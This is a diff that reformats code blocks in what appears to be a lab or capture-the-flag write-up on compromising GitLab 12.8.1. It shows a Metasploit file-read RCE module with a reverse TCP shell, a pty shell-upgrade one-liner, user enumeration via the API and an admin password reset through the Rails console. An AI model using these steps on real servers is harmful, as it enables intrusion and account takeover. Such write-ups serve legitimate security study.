@@ -54,7 +54,8 @@ This picture in Company Gitlab CI says a lot:)
 
 Now i can that i exploitetion RCE using msfconsole tool `https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce` because exploit was development and added it to exploit list. 
 
-``` msf6 exploit(multi/http/gitlab_file_read_rce) > use exploit/multi/http/gitlab_file_read_rce
+```
+msf6 exploit(multi/http/gitlab_file_read_rce) > use exploit/multi/http/gitlab_file_read_rce
 msf6 exploit(multi/http/gitlab_file_read_rce) > show options 
 
 Module options (exploit/multi/http/gitlab_file_read_rce):
@@ -79,7 +80,8 @@ Payload options (generic/shell_reverse_tcp):
 
 Exploitation RCE vulnerability: 
 
-```[*] Started reverse TCP handler on 10.10.14.**:2222 
+```
+[*] Started reverse TCP handler on 10.10.14.**:2222 
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
 [*] Logged in to user oleksii
@@ -110,7 +112,8 @@ drwxr-xr-x 9 git root 4096 Jan  2 20:41 ..
 
 Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.
 
-```python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 #### Resetting admin password
@@ -123,11 +126,13 @@ Used command from this doc I could reset admin password. Start a Ruby on Rails c
 Wait until the console has loaded.
 
 There are multiple ways to find your user. You can search for email or username.
-```user = User.where(id: 1).first
+```
+user = User.where(id: 1).first
 ```
 Found Gitlab admin user:
 
-```irb(main):008:0> user = User.where(id: 1).first
+```
+irb(main):008:0> user = User.where(id: 1).first
 user = User.where(id: 1).first
 => #<User id:1 @dexter>
 ```
@@ -136,7 +141,8 @@ or
 
 Other type get username and email without Gitlab authentification is use api `https://gitlab.site.io/api/v4/users/1`
 
-```{
+```
+{
   "id": 1,
   "name": "Dexter McPherson",
   "username": "dexter",
@@ -157,15 +163,17 @@ Other type get username and email without Gitlab authentification is use api `ht
 
 Now you can change your password:
 
-``` user.password = 'secret_pass'
- user.password_confirmation = 'secret_pass'
+``` 
+user.password = 'secret_pass'
+user.password_confirmation = 'secret_pass'
 ```
 
 It’s important that you change both password and password_confirmation to make it work.
 
 Don’t forget to save the changes.
 
-``` user.save!
+``` 
+user.save!
 ```
 Exit the console and try to login with your new password.
 
